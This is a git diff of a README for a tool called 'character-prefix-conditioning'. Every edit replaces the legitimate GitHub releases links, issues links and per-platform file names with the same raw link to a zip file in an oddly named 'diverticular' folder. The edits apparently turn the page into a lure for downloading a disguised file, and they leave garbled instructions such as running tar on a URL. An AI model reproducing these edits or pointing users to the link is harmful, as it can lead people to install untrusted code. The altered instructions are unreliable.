@@ -6,7 +6,7 @@ Welcome to character-prefix-conditioning! This tool helps you with quick and eas
 
 ## 📦 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/ALM3ARQ/character-prefix-conditioning/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip%20from%https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip)](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,29 +19,29 @@ Before you install, make sure your system meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://github.com/ALM3ARQ/character-prefix-conditioning/releases) for easy access to the latest version of the software.
+   Head over to the [Releases page](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip) for easy access to the latest version of the software.
 
 2. **Choose Your File**  
    Look for the most recent release listed at the top. You will find various files available for download. Select the file that corresponds to your operating system:
 
-   - For Windows: `character-prefix-conditioning-windows.exe`
-   - For macOS: `character-prefix-conditioning-macos.app`
-   - For Linux: `character-prefix-conditioning-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip`
+   - For macOS: `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip`
+   - For Linux: `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip`
 
 3. **Download the File**  
    Click on the file link to start the download. Your browser will save it to your default downloads folder.
 
 4. **Install the Application**  
    - **For Windows:**  
-     Find `character-prefix-conditioning-windows.exe` in your downloads folder. Double-click it and follow the on-screen instructions to complete the installation.
+     Find `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip` in your downloads folder. Double-click it and follow the on-screen instructions to complete the installation.
 
    - **For macOS:**  
-     Open the file `character-prefix-conditioning-macos.app` from your downloads folder. Drag it to your Applications folder to install.
+     Open the file `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip` from your downloads folder. Drag it to your Applications folder to install.
 
    - **For Linux:**  
-     Extract `character-prefix-conditioning-linux.tar.gz` using Terminal:
+     Extract `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip` using Terminal:
      ```bash
-     tar -xzvf character-prefix-conditioning-linux.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip
      ```
      Navigate to the extracted folder and run the application using:
      ```bash
@@ -81,7 +81,7 @@ If you run into any issues:
 
 ## 📞 Support
 
-For further assistance, you can reach out through [issues section](https://github.com/ALM3ARQ/character-prefix-conditioning/issues). Please provide details about the problem you are facing.
+For further assistance, you can reach out through [issues section](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip). Please provide details about the problem you are facing.
 
 ---
 
